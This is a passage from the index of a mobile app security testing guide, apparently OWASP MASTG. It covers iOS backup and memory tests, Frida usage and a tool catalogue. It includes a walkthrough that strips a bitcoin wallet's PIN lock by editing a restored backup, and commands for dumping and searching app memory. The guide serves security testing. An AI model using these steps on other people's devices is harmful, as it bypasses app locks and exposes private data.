backup.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058/#proof-of-concept-removing-ui-lock-with-tampered-backup","title":"Proof of Concept: Removing UI Lock with Tampered Backup","text":"<p>As discussed earlier, sensitive data is not limited to just user data and PII. It can also be configuration or settings files that affect app behavior, restrict functionality, or enable security controls. If you take a look at the open source bitcoin wallet app, Bither, you'll see that it's possible to configure a PIN to lock the UI. And after a few easy steps, you will see how to bypass this UI lock with a modified backup on a non-jailbroken device.</p> <p> </p> <p>After you enable the pin, use iMazing to perform a device backup:</p> <ol> <li>Select your device from the list under the AVAILABLE menu.</li> <li>Click the top menu option Back Up.</li> <li>Follow prompts to complete the backup using defaults.</li> </ol> <p>Next you can open the backup to view app container files within your target app:</p> <ol> <li>Select your device and click Backups on the top right menu.</li> <li>Click the backup you created and select View.</li> <li>Navigate to the Bither app from the Apps directory.</li> </ol> <p>At this point you can view all the backed up content for Bither.</p> <p></p> <p>This is where you can begin parsing through the files looking for sensitive data. In the screenshot you'll see the <code>net.bither.plist</code> file which contains the <code>pin_code</code> attribute. To remove the UI lock restriction, simply delete the <code>pin_code</code> attribute and save the changes.</p> <p>From there it's possible to easily restore the modified version of <code>net.bither.plist</code> back onto the device using the licensed version of iMazing.</p> <p>The free workaround, however, is to find the plist file in the obfuscated backup generated by iTunes/Finder. So create your backup of the device with Bither's PIN code configured. Then, using the steps described earlier, find the backup directory and grep for \"pin_code\" as shown below.</p> <pre><code>$ ~/Library/Application Support/MobileSync/Backup/&lt;UDID&gt;\n$ grep -iRn \"pin_code\" .\nBinary file ./13/135416dd5f251f9251e0f07206277586b7eac6f6 matches\n</code></pre> <p>You'll see there was a match on a binary file with an obfuscated name. This is your <code>net.bither.plist</code> file. Go ahead and rename the file giving it a plist extension so Xcode can easily open it up for you.</p> <p></p> <p>Again, remove the <code>pin_code</code> attribute from the plist and save your changes. Rename the file back to the original name (i.e., without the plist extension) and perform your backup restore. When the restore is complete you'll see that Bither no longer prompts you for the PIN code when launched.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/","title":"MASTG-TEST-0060: Testing Memory for Sensitive Data","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0060: Testing Memory for Sensitive Data (ios)</p> <p> Send Feedback</p>","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/#static-analysis","title":"Static Analysis","text":"<p>When performing static analysis for sensitive data exposed via memory, you should</p> <ul> <li>try to identify application components and map where the data is used,</li> <li>make sure that sensitive data is handled with as few components as possible,</li> <li>make sure that object references are properly removed once the object containing sensitive data is no longer needed,</li> <li>make sure that highly sensitive data is overwritten as soon as it is no longer needed,</li> <li>not pass such data via immutable data types, such as <code>String</code> and <code>NSString</code>,</li> <li>avoid non-primitive data types (because they might leave data behind),</li> <li>overwrite the value in memory before removing references,</li> <li>pay attention to third-party components (libraries and frameworks). Having a public API that handles data according to the recommendations above is a good indicator that developers considered the issues discussed here.</li> </ul>","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are several approaches and tools available for dynamically testing the memory of an iOS app for sensitive data.</p>","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/#retrieving-and-analyzing-a-memory-dump","title":"Retrieving and Analyzing a Memory Dump","text":"<p>Whether you are using a jailbroken or a non-jailbroken device, you can dump the app's process memory with  objection and  Fridump. You can find a detailed explanation of this process in  Process Exploration.</p> <p>After the memory has been dumped (e.g. to a file called \"memory\"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command <code>strings</code> or <code>rabin2 -zz</code> from  rabin2 to extract those strings.</p> <pre><code># using strings\n$ strings memory &gt; strings.txt\n\n# using rabin2\n$ rabin2 -ZZ memory &gt; strings.txt\n</code></pre> <p>Open <code>strings.txt</code> in your favorite editor and dig through it to identify sensitive information.</p> <p>However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (<code>/?</code>) for more information and a list of options. The following shows only a subset of them:</p> <pre><code>$ r2 &lt;name_of_your_dump_file&gt;\n\n[0x00000000]&gt; /?\nUsage: /[!bf] [arg]  Search stuff (see 'e??search' for options)\n|Use io.va for searching in non virtual addressing spaces\n| / foo\\x00                    search for string 'foo\\0'\n| /c[ar]                       search for crypto materials\n| /e /E.F/i                    match regular expression\n| /i foo                       search for string 'foo' ignoring case\n| /m[?][ebm] magicfile         search for magic, filesystems or binary headers\n| /v[1248] value               look for an `cfg.bigendian` 32bit value\n| /w foo                       search for wide string 'f\\0o\\0o\\0'\n| /x ff0033                    search for hex string\n| /z min max                   search for strings of given size\n...\n</code></pre>","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060/#runtime-memory-analysis","title":"Runtime Memory Analysis","text":"<p>Perform  Process Exploration, e.g., using  r2frida, to analyze and inspect the app's memory while running and without needing to dump it.</p> <p>For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash <code>:</code> after starting the session with <code>r2 frida://usb//&lt;name_of_your_app&gt;</code>.</p>","tags":["ios","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/","title":"MASTG-TEST-0215: Sensitive Data Not Excluded From Backup","text":"","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/#overview","title":"Overview","text":"<p>This test verifies whether your app correctly instructs the system to exclude sensitive files from backups.</p> <p>Files in the <code>/tmp</code> and <code>/Library/Caches</code> subdirectories of the app container are excluded from iCloud Backups. For files and directories in any other locations within the app container, iOS provides the <code>isExcludedFromBackup</code> API to guide the system not to back up a given file or directory. However, this API does not guarantee guarantee the actual exclusion:</p> <p>\"The <code>isExcludedFromBackup</code> resource value exists only to provide guidance to the system about which files and directories it can exclude; it's not a mechanism to guarantee those items never appear in a backup or on a restored device.\"</p> <p>Therefore, the only way to properly protect your files from a backup is to encrypt them.</p>","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary, or use a dynamic analysis tool like  Frida for iOS, and look for uses of <code>isExcludedFromBackup</code> API.</li> </ol>","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/#observation","title":"Observation","text":"<p>The output should contain the disassembled code of the functions using <code>isExcludedFromBackup</code> and if possible the list of affected files.</p>","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the use of <code>isExcludedFromBackup</code> within the source code and if any of the affected files can be considered sensitive.</p> <p>For the sensitive files found, and in addition to using <code>isExcludedFromBackup</code>, make sure to encrypt them, as <code>isExcludedFromBackup</code> does not guarantee the exclusion.</p>","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0215/#demos","title":"Demos","text":"<p> MASTG-DEMO-0019: Uses of isExcludedFromBackupKey with r2 </p>","tags":["ios","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tools/","title":"Testing Tools","text":"About the tools listed below <p>The OWASP MASTG includes many tools to assist you in executing test cases, allowing you to perform static analysis, dynamic analysis, network interception, etc. These tools are intended to help you perform your own assessments, rather than provide a conclusive result on the security status of an app. It's important to review the output of these tools carefully, as it can contain both false positives and false negatives.</p> <p>These tools have been tested to work when added, but compatibility may vary depending on your OS version, the device you're testing, or whether you're using a rooted or jailbroken device. Tool functionality may also be affected by specific versions of the rooting/jailbreaking method or the tool itself. OWASP MASTG does not guarantee the functionality of the tools. If you encounter problems, try to search for solutions online or contact the tool owner (e.g. via GitHub Issues).</p> <p>Before proposing a new tool via GitHub Issues/Pull Requests, please check our contribution guidelines.</p> ID Name Platform MASTG-TOOL-0112  pidcat platform:android MASTG-TOOL-0002  MobSF for Android platform:android MASTG-TOOL-0125  Apkleaks platform:android MASTG-TOOL-0028  radare2 for Android platform:android MASTG-TOOL-0116  Blutter platform:android MASTG-TOOL-0022  Proguard platform:android MASTG-TOOL-0024  Scrcpy platform:android MASTG-TOOL-0120  ProxyDroid platform:android MASTG-TOOL-0005  Android NDK platform:android MASTG-TOOL-0018  jadx platform:android MASTG-TOOL-0003  nm - Android platform:android MASTG-TOOL-0016  gplaycli platform:android MASTG-TOOL-0009  APKiD platform:android MASTG-TOOL-0017  House platform:android MASTG-TOOL-0011  Apktool platform:android MASTG-TOOL-0001  Frida for Android platform:android MASTG-TOOL-0004  adb platform:android MASTG-TOOL-0124  aapt2 platform:android MASTG-TOOL-0012  apkx platform:android MASTG-TOOL-0019  jdb platform:android MASTG-TOOL-0099  FlowDroid platform:android MASTG-TOOL-0103  uber-apk-signer platform:android MASTG-TOOL-0020  JustTrustMe platform:android MASTG-TOOL-0006  Android SDK platform:android MASTG-TOOL-0130  blint platform:android MASTG-TOOL-0021  Magisk platform:android MASTG-TOOL-0023  RootCloak Plus platform:android MASTG-TOOL-0025  SSLUnpinning platform:android MASTG-TOOL-0107  JNITrace platform:android MASTG-TOOL-0010  APKLab platform:android MASTG-TOOL-0007  Android Studio platform:android MASTG-TOOL-0030  Angr platform:android MASTG-TOOL-0026  Termux platform:android MASTG-TOOL-0008  Android-SSL-TrustKiller platform:android MASTG-TOOL-0029  objection for Android platform:android MASTG-TOOL-0140  frida-multiple-unpinning platform:android MASTG-TOOL-0123  apksigner platform:android MASTG-TOOL-0027  Xposed platform:android MASTG-TOOL-0015  drozer platform:android MASTG-TOOL-0013  Busybox platform:android MASTG-TOOL-0014  Bytecode Viewer platform:android MASTG-TOOL-0108  Corellium platform:generic MASTG-TOOL-0101  disable-flutter-tls-verification platform:generic MASTG-TOOL-0034  LIEF platform:generic MASTG-TOOL-0037  RMS Runtime Mobile Security platform:generic MASTG-TOOL-0133  Visual Studio Code (vscode) platform:generic MASTG-TOOL-0104  hermes-dec platform:generic MASTG-TOOL-0038  objection platform:generic MASTG-TOOL-0032  Frida CodeShare platform:generic MASTG-TOOL-0132  dependency-track platform:generic MASTG-TOOL-0110  semgrep platform:generic MASTG-TOOL-0036  r2frida platform:generic MASTG-TOOL-0031  Frida platform:generic MASTG-TOOL-0098  iaito platform:generic MASTG-TOOL-0100  reFlutter platform:generic MASTG-TOOL-0134  cdxgen platform:generic MASTG-TOOL-0131  dependency-check platform:generic MASTG-TOOL-0106  Fridump platform:generic MASTG-TOOL-0035  MobSF platform:generic MASTG-TOOL-0129  rabin2 platform:generic MASTG-TOOL-0033  Ghidra platform:generic MASTG-TOOL-0039  Frida for iOS platform:ios MASTG-TOOL-0060  otool platform:ios MASTG-TOOL-0061  Grapefruit platform:ios MASTG-TOOL-0127  AppSync Unified platform:ios MASTG-TOOL-0126  libimobiledevice suite platform:ios MASTG-TOOL-0044  class-dump-z platform:ios MASTG-TOOL-0056  Keychain-Dumper platform:ios MASTG-TOOL-0049  Frida-cycript platform:ios MASTG-TOOL-0135  PlistBuddy platform:ios MASTG-TOOL-0047  Cydia platform:ios MASTG-TOOL-0045  class-dump-dyld platform:ios MASTG-TOOL-0065  simctl platform:ios MASTG-TOOL-0102  ios-app-signer platform:ios MASTG-TOOL-0062  Plutil platform:ios MASTG-TOOL-0069  Usbmuxd platform:ios MASTG-TOOL-0053  iOSbackup platform:ios MASTG-TOOL-0042  BinaryCookieReader platform:ios MASTG-TOOL-0114  codesign platform:ios MASTG-TOOL-0055  iproxy platform:ios MASTG-TOOL-0050  Frida-ios-dump platform:ios MASTG-TOOL-0074  objection for iOS platform:ios MASTG-TOOL-0054  ios-deploy platform:ios MASTG-TOOL-0040  MobSF for iOS platform:ios MASTG-TOOL-0058  MachoOView platform:ios MASTG-TOOL-0046  Cycript platform:ios MASTG-TOOL-0051  gdb platform:ios MASTG-TOOL-0073  radare2 for iOS platform:ios MASTG-TOOL-0072  xcrun platform:ios MASTG-TOOL-0136  plistlib platform:ios MASTG-TOOL-0137  GlobalWebInspect platform:ios MASTG-TOOL-0070  Xcode platform:ios MASTG-TOOL-0122  c++filt platform:ios MASTG-TOOL-0064  Sileo platform:ios MASTG-TOOL-0066  SSL Kill Switch 3 platform:ios MASTG-TOOL-0139  ElleKit platform:ios MASTG-TOOL-0138  ipainstaller platform:ios MASTG-TOOL-0048  dsdump platform:ios MASTG-TOOL-0105  ipsw platform:ios MASTG-TOOL-0121  objdump - iOS platform:ios MASTG-TOOL-0142  Choicy platform:ios MASTG-TOOL-0071  Xcode Command Line Tools platform:ios MASTG-TOOL-0111  ldid platform:ios MASTG-TOOL-0059  optool platform:ios MASTG-TOOL-0043  class-dump platform:ios MASTG-TOOL-0141  IOSSecuritySuite platform:ios MASTG-TOOL-0057  lldb platform:ios MASTG-TOOL-0068  SwiftShield platform:ios MASTG-TOOL-0128  Filza platform:ios MASTG-TOOL-0067  swift-demangle platform:ios MASTG-TOOL-0118  Sideloadly platform:ios MASTG-TOOL-0041  nm - iOS platform:ios MASTG-TOOL-0063  security platform:ios MASTG-TOOL-0117  fastlane platform:ios MASTG-TOOL-0080  tcpdump platform:network MASTG-TOOL-0143  badssl platform:network MASTG-TOOL-0075  Android tcpdump platform:network MASTG-TOOL-0079  ZAP platform:network MASTG-TOOL-0097  mitmproxy platform:network MASTG-TOOL-0077  Burp Suite platform:network MASTG-TOOL-0076  bettercap platform:network MASTG-TOOL-0115  HTTP Toolkit platform:network MASTG-TOOL-0109  Nope-Proxy platform:network MASTG-TOOL-0078  MITM Relay platform:network MASTG-TOOL-0081  Wireshark platform:network <p></p>","tags":[]},{"location":"MASTG/tools/android/MASTG-TOOL-0001/","title":"MASTG-TOOL-0001: Frida for Android","text":"<p>Frida supports interaction with the Android Java runtime though the Java API. You'll be able to hook and call both Java and native functions inside the process and its native libraries. Your JavaScript snippets have full access to memory, e.g. to read and/or write any structured data.</p> <p>Here are some tasks that Frida APIs offers and are relevant or exclusive on Android:</p> <ul> <li>Instantiate Java objects and call static and non-static class methods (Java API).</li> <li>Replace Java method implementations (Java API).</li> <li>Enumerate live instances of specific classes by scanning the Java heap (Java API).</li> <li>Scan process memory for occurrences of a string (Memory API).</li> <li>Intercept native function calls to run your own code at function entry and exit (Interceptor API).</li> </ul> <p>Remember that on Android, you can also benefit from the built-in tools provided when installing Frida, that includes the Frida CLI (<code>frida</code>), <code>frida-ps</code>, <code>frida-ls-devices</code> and <code>frida-trace</code>, to name some of them.</p> <p>Frida is often compared to Xposed, however this comparison is far from fair as both frameworks were designed with different goals in mind. This is important to understand as an app security tester so that you can know which framework to use in which situation:</p> <ul> <li>Frida is standalone, all you need is to run the frida-server binary from a known location in your target Android device (see \"Installing Frida\" below). This means that, in contrast to Xposed, it is not deep installed in the target OS.</li> <li>Reversing an app is an iterative process. As a consequence of the previous point, you obtain a shorter feedback loop when testing as you don't need to (soft) reboot to apply or simply update your hooks. So you might prefer to use Xposed when implementing more permanent hooks.</li> <li>You may inject and update your Frida JavaScript code on the fly at any point during the runtime of your process (similarly to Cycript on iOS). This way you can perform the so-called early instrumentation by letting Frida spawn your app or you may prefer to attach to a running app that you might have brought to a certain state.</li> <li>Frida is able to handle both Java as well as native code (JNI), allowing you to modify both of them. This is unfortunately a limitation of Xposed which lacks of native code support.</li> </ul> <p>Note that Xposed, as of early 2019, does not work on Android 9 (API level 28) yet.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0001/#installing-frida-on-android","title":"Installing Frida on Android","text":"<p>In order to set up Frida on your Android device:</p> <ul> <li>If your device is not rooted, you can also use Frida, please refer to  Dynamic Analysis on Non-Rooted Devices.</li> <li>If you have a rooted device, simply follow the official instructions or follow the hints below.</li> </ul> <p>We assume a rooted device here unless otherwise noted. Download the frida-server binary from the Frida releases page. Make sure that you download the right frida-server binary for the architecture of your Android device or emulator: x86, x86_64, arm or arm64. Make sure that the server version (at least the major version number) matches the version of your local Frida installation. PyPI usually installs the latest version of Frida. If you're unsure which version is installed, you can check with the Frida command line tool:</p> <pre><code>frida --version\n</code></pre> <p>Or you can run the following command to automatically detect Frida version and download the right frida-server binary:</p> <pre><code>wget https://github.com/frida/frida/releases/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz\n</code></pre> <p>Copy frida-server to the device and run it:</p> <pre><code>adb push frida-server /data/local/tmp/\nadb shell \"chmod 755 /data/local/tmp/frida-server\"\nadb shell \"su -c /data/local/tmp/frida-server &amp;\"\n</code></pre>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0001/#using-frida-on-android","title":"Using Frida on Android","text":"<p>With frida-server running, you should now be able to get a list of running processes with the following command (use the <code>-U</code> option to indicate Frida to use a connected USB devices or emulator):</p> <pre><code>$ frida-ps -U\n  PID  Name\n-----  --------------------------------------------------------------\n  276  adbd\n  956  android.process.media\n  198  bridgemgrd\n30692  com.android.chrome\n30774  com.android.chrome:privileged_process0\n30747  com.android.chrome:sandboxed\n30834  com.android.chrome:sandboxed\n 3059  com.android.nfc\n 1526  com.android.phone\n17104  com.android.settings\n 1302  com.android.systemui\n(...)\n</code></pre> <p>Or restrict the list with the <code>-Uai</code> flag combination to get all apps (<code>-a</code>) currently installed (<code>-i</code>) on the connected USB device (<code>-U</code>):</p> <pre><code>$ frida-ps -Uai\n  PID  Name                                      Identifier\n-----  ----------------------------------------  ------------------------------\n  766  Android System                            android\n30692  Chrome                                    com.android.chrome\n 3520  Contacts Storage                          com.android.providers.contacts\n    -  Uncrackable1                              sg.vantagepoint.uncrackable1\n    -  drozer Agent                              com.mwr.dz\n</code></pre> <p>This will show the names and identifiers of all apps, if they are currently running it will also show their PIDs. Search for your app in the list and take a note of the PID or its name/identifier. From now on you'll refer to your app by using one of them. A recommendation is to use the identifiers, as the PIDs will change on each run of the app. For example let's take <code>com.android.chrome</code>. You can use this string now on all Frida tools, e.g. on the Frida CLI, on frida-trace or from a Python script.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0001/#tracing-native-libraries-with-frida-trace","title":"Tracing Native Libraries with frida-trace","text":"<p>To trace specific (low-level) library calls, you can use the <code>frida-trace</code> command line tool:</p> <pre><code>frida-trace -U com.android.chrome -i \"open\"\n</code></pre> <p>This generates a little JavaScript in <code>__handlers__/libc.so/open.js</code>, which Frida injects into the process. The script traces all calls to the <code>open</code> function in <code>libc.so</code>. You can modify the generated script according to your needs with Frida JavaScript API.</p> <p>Unfortunately tracing high-level methods of Java classes is not yet supported (but might be in the future).</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0001/#frida-cli-and-the-java-api","title":"Frida CLI and the Java API","text":"<p>Use the Frida CLI tool (<code>frida</code>) to work with Frida interactively. It hooks into a process and gives you a command line interface to Frida's API.</p> <pre><code>frida -U com.android.chrome\n</code></pre> <p>With the <code>-l</code> option, you can also use the Frida CLI to load scripts , e.g., to load <code>myscript.js</code>:</p> <pre><code>frida -U -l myscript.js com.android.chrome\n</code></pre> <p>Frida also provides a Java API, which is especially helpful for dealing with Android apps. It lets you work with Java classes and objects directly. Here is a script to overwrite the <code>onResume</code> function of an Activity class:</p> <pre><code>Java.perform(function () {\n    var Activity = Java.use(\"android.app.Activity\");\n    Activity.onResume.implementation = function () {\n        console.log(\"[*] onResume() got called!\");\n        this.onResume();\n    };\n});\n</code></pre> <p>The above script calls <code>Java.perform</code> to make sure that your code gets executed in the context of the Java VM. It instantiates a wrapper for the <code>android.app.Activity</code> class via <code>Java.use</code> and overwrites the <code>onResume</code> function. The new <code>onResume</code> function implementation prints a notice to the console and calls the original <code>onResume</code> method by invoking <code>this.onResume</code> every time an activity is resumed in the app.</p> <p> jadx can generate Frida snippets through its graphical code browser. To use this feature, open the APK or DEX with <code>jadx-gui</code>, browse to the target method, right click the method name, and select \"Copy as frida snippet (f)\". For example using the MASTG  Android UnCrackable L1:</p> <p></p> <p>The above steps place the following output in the pasteboard, which you can then paste in a JavaScript file and feed into <code>frida -U -l</code>.</p> <pre><code>let a = Java.use(\"sg.vantagepoint.a.a\");\na[\"a\"].implementation = function (bArr, bArr2) {\n    console.log('a is called' + ', ' + 'bArr: ' + bArr + ', ' + 'bArr2: ' + bArr2);\n    let ret = this.a(bArr, bArr2);\n    console.log('a ret value is ' + ret);\n    return ret;\n};\n</code></pre> <p>The above code hooks the <code>a</code> method within the <code>sg.vantagepoint.a.a</code> class and logs its input parameters and return values.</p> <p>Frida also lets you search for and work with instantiated objects that are on the heap. The following script searches for instances of <code>android.view.View</code> objects and calls their <code>toString</code> method. The result is printed to the console:</p> <pre><code>setImmediate(function() {\n    console.log(\"[*] Starting script\");\n    Java.perform(function () {\n        Java.choose(\"android.view.View\", {\n             \"onMatch\":function(instance){\n                  console.log(\"[*] Instance found: \" + instance.toString());\n             },\n             \"onComplete\":function() {\n                  console.log(\"[*] Finished heap search\")\n             }\n        });\n    });\n});\n</code></pre> <p>The output would look like this:</p> <pre><code>[*] Starting script\n[*] Instance found: android.view.View{7ccea78 G.ED..... ......ID 0,0-0,0 #7f0c01fc app:id/action_bar_black_background}\n[*] Instance found: android.view.View{2809551 V.ED..... ........ 0,1731-0,1731 #7f0c01ff app:id/menu_anchor_stub}\n[*] Instance found: android.view.View{be471b6 G.ED..... ......I. 0,0-0,0 #7f0c01f5 app:id/location_bar_verbose_status_separator}\n[*] Instance found: android.view.View{3ae0eb7 V.ED..... ........ 0,0-1080,63 #102002f android:id/statusBarBackground}\n[*] Finished heap search\n</code></pre> <p>You can also use Java's reflection capabilities. To list the public methods of the <code>android.view.View</code> class, you could create a wrapper for this class in Frida and call <code>getMethods</code> from the wrapper's <code>class</code> property:</p> <pre><code>Java.perform(function () {\n    var view = Java.use(\"android.view.View\");\n    var methods = view.class.getMethods();\n    for(var i = 0; i &lt; methods.length; i++) {\n        console.log(methods[i].toString());\n    }\n});\n</code></pre> <p>This will print a very long list of methods to the terminal:</p> <pre><code>public boolean android.view.View.canResolveLayoutDirection()\npublic boolean android.view.View.canResolveTextAlignment()\npublic boolean android.view.View.canResolveTextDirection()\npublic boolean android.view.View.canScrollHorizontally(int)\npublic boolean android.view.View.canScrollVertically(int)\npublic final void android.view.View.cancelDragAndDrop()\npublic void android.view.View.cancelLongPress()\npublic final void android.view.View.cancelPendingInputEvents()\n...\n</code></pre>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0002/","title":"MASTG-TOOL-0002: MobSF for Android","text":"<p>  After MobSF is done with its analysis, you will receive a one-page overview of all the tests that were executed. The page is split up into multiple sections giving some first hints on the attack surface of the application.</p> <p></p> <p>The following is displayed:</p> <ul> <li>Basic information about the app and its binary file.</li> <li>Some options to:<ul> <li>View the <code>AndroidManifest.xml</code> file.</li> <li>View the IPC components of the app.</li> </ul> </li> <li>Signer certificate.</li> <li>App permissions.</li> <li>A security analysis showing known defects e.g. if the app backups are enabled.</li> <li>List of libraries used by the app binary and list of all files inside the unzipped APK.</li> <li>Malware analysis that checks for malicious URLs.</li> </ul> <p>Refer to MobSF documentation for more details.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0003/","title":"MASTG-TOOL-0003: nm - Android","text":"<p>nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for the Android (GNU) version.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0004/","title":"MASTG-TOOL-0004: adb","text":"<p>adb (Android Debug Bridge), shipped with the Android SDK, bridges the gap between your local development environment and a connected Android device. You'll usually leverage it to test apps on the emulator or a connected device via USB or Wi-Fi. Use the <code>adb devices</code> command to list the connected devices and execute it with the <code>-l</code> argument to retrieve more details on them.</p> <pre><code>$ adb devices -l\nList of devices attached\n090c285c0b97f748 device usb:1-1 product:razor model:Nexus_7 device:flo\nemulator-5554    device product:sdk_google_phone_x86 model:Android_SDK_built_for_x86 device:generic_x86 transport_id:1\n</code></pre> <p>adb provides other useful commands such as <code>adb shell</code> to start an interactive shell on a target and <code>adb forward</code> to forward traffic on a specific host port to a different port on a connect device.</p> <pre><code>adb forward tcp:&lt;host port&gt; tcp:&lt;device port&gt;\n</code></pre> <pre><code>$ adb -s emulator-5554 shell\nroot@generic_x86:/ # ls\nacct\ncache\ncharger\nconfig\n...\n</code></pre> <p>You'll come across different use cases on how you can use adb commands when testing later in this book. Note that you must define the serialnummer of the target device with the <code>-s</code> argument (as shown by the previous code snippet) in case you have multiple devices connected.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0005/","title":"MASTG-TOOL-0005: Android NDK","text":"<p>The Android NDK contains prebuilt versions of the native compiler and toolchain. Both the GCC and Clang compilers have traditionally been supported, but active support for GCC ended with NDK revision 14. The device architecture and host OS determine the appropriate version. The prebuilt toolchains are in the <code>toolchains</code> directory of the NDK, which contains one subdirectory for each architecture.</p> Architecture Toolchain name ARM-based arm-linux-androideabi-&lt;gcc-version&gt; x86-based x86-&lt;gcc-version&gt; MIPS-based mipsel-linux-android-&lt;gcc-version&gt; ARM64-based aarch64-linux-android-&lt;gcc-version&gt; X86-64-based x86_64-&lt;gcc-version&gt; MIPS64-based mips64el-linux-android-&lt;gcc-version&gt; <p>Besides picking the right architecture, you need to specify the correct sysroot for the native API level you want to target. The sysroot is a directory that contains the system headers and libraries for your target. Native APIs vary by Android API level. Available sysroot directories for each Android API level can be found in <code>$NDK/platforms/</code>. Each API level directory contains subdirectories for the various CPUs and architectures.</p> <p>One possibility for setting up the build system is exporting the compiler path and necessary flags as environment variables. To make things easier, however, the NDK allows you to create a so-called standalone toolchain, which is a temporary toolchain that incorporates the required settings.</p> <p>To set up a standalone toolchain, download the latest stable version of the NDK. Extract the ZIP file, change into the NDK root directory, and run the following command:</p> <pre><code>./build/tools/make_standalone_toolchain.py --arch arm --api 24 --install-dir /tmp/android-7-toolchain\n</code></pre> <p>This creates a standalone toolchain for Android 7.0 (API level 24) in the directory <code>/tmp/android-7-toolchain</code>. For convenience, you can export an environment variable that points to your toolchain directory, (we'll be using this in the examples). Run the following command or add it to your <code>.bash_profile</code> or other startup script:</p> <pre><code>export TOOLCHAIN=/tmp/android-7-toolchain\n</code></pre>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0006/","title":"MASTG-TOOL-0006: Android SDK","text":"<p>Local Android SDK installations are managed via Android Studio. Create an empty project in Android Studio and select Tools -&gt; SDK Manager to open the SDK Manager GUI. The SDK Platforms tab is where you install SDKs for multiple API levels. Recent API levels are:</p> <ul> <li>Android 11.0 (API level 30)</li> <li>Android 10.0 (API level 29)</li> <li>Android 9.0 (API level 28)</li> <li>Android 8.1 (API level 27)</li> <li>Android 8.0 (API level 26)</li> </ul> <p>An overview of all Android codenames, their version number and API levels can be found in the Android Developer Documentation.</p> <p></p> <p>Installed SDKs are on the following paths:</p> <p>Windows:</p> <pre><code>C:\\Users\\&lt;username&gt;\\AppData\\Local\\Android\\sdk\n</code></pre> <p>MacOS:</p> <pre><code>/Users/&lt;username&gt;/Library/Android/sdk\n</code></pre> <p>Note: On Linux, you need to choose an SDK directory. <code>/opt</code>, <code>/srv</code>, and <code>/usr/local</code> are common choices.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0007/","title":"MASTG-TOOL-0007: Android Studio","text":"<p>The official IDE for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development - https://developer.android.com/studio/index.html</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0008/","title":"MASTG-TOOL-0008: Android-SSL-TrustKiller","text":"<p>  Android-SSL-TrustKiller is a Cydia Substrate Module acting as a blackbox tool to bypass SSL certificate pinning for most applications running on a device - https://github.com/iSECPartners/Android-SSL-TrustKiller</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0009/","title":"MASTG-TOOL-0009: APKiD","text":"<p> APKiD gives you information about how an APK was made. It identifies many compilers, packers, obfuscators, and other weird stuff.</p> <p>For more information on what this tool can be used for, check out:</p> <ul> <li>Android Compiler Fingerprinting</li> <li>Detecting Pirated and Malicious Android Apps with APKiD</li> <li>APKiD: PEiD for Android Apps</li> <li>APKiD: Fast Identification of AppShielding Products</li> </ul>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0010/","title":"MASTG-TOOL-0010: APKLab","text":"<p>{:target=\"blank\"}  APKLab is a convenient Visual Studio Code extension leveraging tools such as  Apktool and  jadx_ to enable features including app unpacking, decompilation, code patching (e.g. for MITM), and repackaging straight from the IDE.</p> <p>For more information, you can refer to 